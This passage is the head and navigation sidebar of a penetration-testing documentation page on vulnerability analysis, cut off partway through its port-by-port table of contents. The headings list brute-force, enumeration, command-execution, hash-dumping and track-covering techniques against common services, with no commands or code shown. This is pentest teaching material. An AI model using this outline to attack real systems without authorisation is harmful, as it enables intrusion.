<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-R21NVEB2EY');
    </script>
    
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vulnerability Analysis &mdash; tech.bitvijays.com 2.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=51b770b3"></script>
        <script src="../_static/doctools.js?v=9a2dae69"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
        <script src="../_static/debug.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Exploitation" href="LFF-IPS-P3-Exploitation.html" />
    <link rel="prev" title="Intelligence Gathering" href="LFF-IPS-P1-IntelligenceGathering.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            tech.bitvijays.com
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Vulnerability Analysis</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#port-21-ftp">Port 21 - FTP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#metasploit">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ftp-version-scanner">FTP Version Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#anonymous-ftp-access-detection">Anonymous FTP Access Detection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ftp-authentication-scanner">FTP Authentication Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ftp-bounce-port-scanner">FTP Bounce Port Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#nmap">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ftp-anon">ftp-anon</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ftp-brute">ftp-brute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ftp-bounce">ftp-bounce</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-22-ssh">Port 22 - SSH</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ssh-version-scanner">SSH Version Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssh-brute-force">SSH Brute force</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id2">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ssh2-enum-algos">ssh2-enum-algos</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssh-hostkey">SSH-Hostkey</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sshv1">SSHv1</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-23-telnet">Port 23 - Telnet</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id3">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#telnet-version">Telnet version</a></li>
<li class="toctree-l4"><a class="reference internal" href="#telnet-login-check-scanner">Telnet Login Check Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id4">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#telnet-brute">Telnet-brute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#telnet-encryption">Telnet-encryption</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-25-smtp-port-587-submission">Port 25 - SMTP | Port 587 - Submission</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id5">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#smtp-version">SMTP_Version</a></li>
<li class="toctree-l4"><a class="reference internal" href="#smtp-open-relays">SMTP Open Relays</a></li>
<li class="toctree-l4"><a class="reference internal" href="#smtp-user-enumeration-utility">SMTP User Enumeration Utility</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#nmap-nse">Nmap NSE</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#smtp-brute">SMTP-brute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#smtp-commands">SMTP-Commands</a></li>
<li class="toctree-l4"><a class="reference internal" href="#smtp-enum-users">SMTP-enum-users</a></li>
<li class="toctree-l4"><a class="reference internal" href="#smtp-open-relay">SMTP-open-relay</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#other">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id6">SMTP Commands</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-53-dns">Port 53 - DNS</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id7">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#dns-bruteforce-enumeration">DNS Bruteforce Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-basic-information-enumeration">DNS Basic Information Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-reverse-lookup-enumeration">DNS Reverse Lookup Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-common-service-record-enumeration">DNS Common Service Record Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-record-scanner-and-enumerator">DNS Record Scanner and Enumerator</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-amplification-scanner">DNS Amplification Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-non-recursive-record-scraper">DNS Non-Recursive Record Scraper</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id8">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#broadcast-dns-service-discovery">Broadcast-dns-service-discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-blacklist">DNS-blacklist</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-brute">DNS-brute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-cache-snoop">DNS-Cache-snoop</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-check-zone">DNS-Check-zone</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-nsid">DNS-nsid</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-recursion">DNS-recursion</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-service-discovery">DNS-Service-Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-srv-enum">DNS-SRV-Enum</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-zone-transfer">DNS-Zone-Transfer</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-79-finger">Port 79 - Finger</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id9">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#finger-service-user-enumerator">Finger Service User Enumerator</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id10">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#finger">Finger</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id11">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id12">finger</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#http">HTTP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#webmin">Webmin</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id14">Metasploit</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#jenkins">Jenkins</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id15">Metasploit</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#apache-tomcat">Apache Tomcat</a></li>
<li class="toctree-l3"><a class="reference internal" href="#jboss">JBoss</a></li>
<li class="toctree-l3"><a class="reference internal" href="#lotus-domino-httpd">Lotus Domino httpd</a></li>
<li class="toctree-l3"><a class="reference internal" href="#iis">IIS</a></li>
<li class="toctree-l3"><a class="reference internal" href="#vmware-esxi">VMware ESXi</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-88-kerberos">Port 88 - Kerberos</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id16">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#krb5-enum-users">krb5-enum-users</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-110-pop3">Port 110 - POP3</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id17">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#pop3-banner-grabber">POP3 Banner Grabber</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pop3-login-utility">POP3 Login Utility</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id18">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#pop3-capabilities">POP3-capabilities</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pop3-brute">POP3-brute</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id19">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#pop3-commands">POP3 Commands</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-111-rpcinfo">Port 111 - RPCInfo</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id20">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#nfs-mount-scanner">NFS Mount Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id21">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rpcinfo">rpcinfo</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-113-ident">Port 113 - Ident</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id22">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#auth-owners">Auth-owners</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id23">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ident-user-enum">Ident-user-enum</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#nntp-network-news-transfer-protocol">NNTP Network News Transfer Protocol</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#commands">Commands</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#capabilities">CAPABILITIES</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mode-reader">MODE READER</a></li>
<li class="toctree-l4"><a class="reference internal" href="#quit">QUIT</a></li>
<li class="toctree-l4"><a class="reference internal" href="#listgroup">LISTGROUP</a></li>
<li class="toctree-l4"><a class="reference internal" href="#article">ARTICLE</a></li>
<li class="toctree-l4"><a class="reference internal" href="#post">POST</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#netbios">NetBios</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id25">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#broadcast-netbios-master-browser">broadcast-netbios-master-browser</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-161-snmp">Port 161 - SNMP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id26">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#snmp-community-scanner">SNMP Community Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#snmp-enumeration-module">SNMP Enumeration Module</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-264-check-point-firewall-1-topology">Port 264 - Check Point FireWall-1 Topology</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id27">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#checkpoint-firewall-1-securemote-topology-service-hostname-disclosure">CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-389-ldap">Port 389 - LDAP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id28">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ldap-rootdse">LDAP-rootdse</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ldap-search">ldap-search</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ldap-brute">ldap-brute</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id29">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ldapsearch">ldapsearch</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-445-smb">Port 445 - SMB</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id31">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#smb-version-detection">SMB Version Detection</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-512-rexec">Port 512 - rexec</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id32">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rexec-authentication-scanner">rexec Authentication Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id33">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rlogin">rlogin</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id34">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rexec-brute">rexec-brute</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-513-rlogin">Port 513 - rlogin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id35">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rlogin-authentication-scanner">rlogin Authentication Scanner</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-514-rsh">Port 514 - RSH</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id36">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rsh-authentication-scanner">rsh Authentication Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id37">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rsh">rsh</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-548-afp-apple-filing-protocol">Port 548 - AFP (Apple Filing Protocol)</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id38">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#apple-filing-protocol-info-enumerator">Apple Filing Protocol Info Enumerator</a></li>
<li class="toctree-l4"><a class="reference internal" href="#apple-filing-protocol-login-utility">Apple Filing Protocol Login Utility</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id39">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#afp-serverinfo">afp-serverinfo</a></li>
<li class="toctree-l4"><a class="reference internal" href="#afp-brute">afp-brute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#afp-ls">afp-ls</a></li>
<li class="toctree-l4"><a class="reference internal" href="#afp-showmount">afp-showmount</a></li>
<li class="toctree-l4"><a class="reference internal" href="#afp-path-vuln">afp-path-vuln</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593">Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id40">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#endpoint-mapper-service-discovery">Endpoint Mapper Service Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="#hidden-dcerpc-service-discovery">Hidden DCERPC Service Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="#remote-management-interface-discovery">Remote Management Interface Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dcerpc-tcp-service-auditor">DCERPC TCP Service Auditor</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id41">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rpcdump">rpcdump</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-443-8443-https">Port 443/8443 - HTTPS</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id42">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#http-ssl-certificate-information">HTTP SSL Certificate Information</a></li>
<li class="toctree-l4"><a class="reference internal" href="#http-ssl-tls-version-detection-poodle-scanner">HTTP SSL/TLS Version Detection (POODLE scanner)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#openssl-server-side-changecipherspec-injection-scanner">OpenSSL Server-Side ChangeCipherSpec Injection Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#openssl-heartbeat-heartbleed-information-leak">OpenSSL Heartbeat (Heartbleed) Information Leak</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id43">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ssl-cert">ssl-cert</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-dh-params">ssl-dh-params</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-google-cert-catalog">ssl-google-cert-catalog</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sslv2">sslv2</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-ccs-injection">ssl-ccs-injection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-date">ssl-date</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-enum-ciphers">ssl-enum-ciphers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-heartbleed">ssl-heartbleed</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ssl-poodle">ssl-poodle</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-554-8554-rtsp">Port 554/8554 - RTSP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id45">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rtsp-methods">rtsp-methods</a></li>
<li class="toctree-l4"><a class="reference internal" href="#rtsp-url-brute">rtsp-url-brute</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id46">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#cameradar">Cameradar</a></li>
<li class="toctree-l4"><a class="reference internal" href="#blogs">Blogs</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-873-rsync">Port 873 - Rsync</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id48">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#list-rsync-modules">List Rsync Modules</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id49">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rsync-list-modules">rsync-list-modules</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id50">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rsync">rsync</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-1099-java-rmi">Port 1099 - Java RMI</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id51">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#java-rmi-server-insecure-endpoint-code-execution-scanner">Java RMI Server Insecure Endpoint Code Execution Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#java-rmi-server-insecure-default-configuration-java-code-execution">Java RMI Server Insecure Default Configuration Java Code Execution</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id52">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rmi-vuln-classloader">rmi-vuln-classloader</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-1433-ms-sql">Port 1433 - MS-SQL</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id53">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mssql-ping-utility">MSSQL Ping Utility</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mssql-login-utility">MSSQL Login Utility</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-configuration-enumerator">Microsoft SQL Server Configuration Enumerator</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-xp-cmdshell-command-execution">Microsoft SQL Server xp_cmdshell Command Execution</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-suser-sname-windows-domain-account-enumeration">Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-find-and-sample-data">Microsoft SQL Server Find and Sample Data</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-generic-query">Microsoft SQL Server Generic Query</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mssql-schema-dump">MSSQL Schema Dump</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id54">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#tsql">tsql</a></li>
<li class="toctree-l4"><a class="reference internal" href="#microsoft-sql-server-management">Microsoft SQL Server Management</a></li>
<li class="toctree-l4"><a class="reference internal" href="#default-ms-sql-system-tables">Default MS-SQL System Tables</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reference-hacking-sql-server-stored-procedures">Reference - Hacking SQL Server Stored Procedures</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#part-1-un-trustworthy-databases">Part 1: (un)Trustworthy Databases</a></li>
<li class="toctree-l4"><a class="reference internal" href="#part-2-user-impersonation">Part 2: User Impersonation</a></li>
<li class="toctree-l4"><a class="reference internal" href="#part-3-sql-injection">Part 3: SQL Injection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#part-4-enumerating-domain-accounts">Part 4: Enumerating Domain Accounts</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reference-other-blogs">Reference - Other Blogs</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mssql-mitm">MSSQL-MITM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#others">Others</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-1521-oracle">Port 1521 - Oracle</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#oracle-attack-methodology">Oracle Attack Methodology</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#locate-oracle-systems">Locate Oracle Systems</a></li>
<li class="toctree-l4"><a class="reference internal" href="#determine-oracle-version">Determine Oracle Version</a></li>
<li class="toctree-l4"><a class="reference internal" href="#determine-oracle-sid">Determine Oracle SID</a></li>
<li class="toctree-l4"><a class="reference internal" href="#guess-bruteforce-user-pass">Guess/Bruteforce USER/PASS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#privilege-escalation-via-sql-injection">Privilege Escalation via SQL Injection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#manipulate-data-post-exploitation">Manipulate Data/Post Exploitation</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cover-tracks">Cover Tracks</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-2049-nfs">Port 2049 - NFS</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#nfsshell">nfsshell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#using-nfsshell">Using nfsshell</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-3260-iscsi">Port 3260 - ISCSI</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id56">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#iscsi-info">iscsi-info</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id57">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#iscsiadm">iscsiadm</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-3299-sap-router">Port 3299 - SAP Router</a></li>
<li class="toctree-l2"><a class="reference internal" href="#port-3306-mysql">Port 3306 - MySQL</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id59">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mysql-server-version-enumeration">MySQL Server Version Enumeration</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mysql-login-utility">MySQL Login Utility</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mysql-password-hashdump">MYSQL Password Hashdump</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id60">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mysql">mysql</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-5432-postgresql">Port 5432 - Postgresql</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id62">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#postgresql-version-probe">PostgreSQL Version Probe</a></li>
<li class="toctree-l4"><a class="reference internal" href="#postgresql-login-utility">PostgreSQL Login Utility</a></li>
<li class="toctree-l4"><a class="reference internal" href="#postgresql-database-name-command-line-flag-injection">PostgreSQL Database Name Command Line Flag Injection</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-5555-hpdataprotector-rce">Port 5555 - HPDataProtector RCE</a></li>
<li class="toctree-l2"><a class="reference internal" href="#port-5900-vnc">Port 5900 - VNC</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id63">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#vnc-authentication-none-detection">VNC Authentication None Detection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#vnc-authentication-scanner">VNC Authentication Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#vnc-password">VNC Password</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-5984-couchdb">Port 5984 - CouchDB</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#x11-port-6000">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#database-list">Database List</a></li>
<li class="toctree-l4"><a class="reference internal" href="#document-list">Document List</a></li>
<li class="toctree-l4"><a class="reference internal" href="#read-value-document">Read Value Document</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-6000-x11">Port 6000 - X11</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id65">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#x11-no-auth-scanner">X11 No-Auth Scanner</a></li>
<li class="toctree-l4"><a class="reference internal" href="#x11-keyboard-command-injection">X11 Keyboard Command Injection</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id66">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#xspy">xspy</a></li>
<li class="toctree-l4"><a class="reference internal" href="#xdpyinfo">xdpyinfo</a></li>
<li class="toctree-l4"><a class="reference internal" href="#xwd">xwd</a></li>
<li class="toctree-l4"><a class="reference internal" href="#xwininfo">xwininfo</a></li>
<li class="toctree-l4"><a class="reference internal" href="#xwatchwin">XWatchwin</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-6379-redis">Port 6379 - Redis</a><ul>
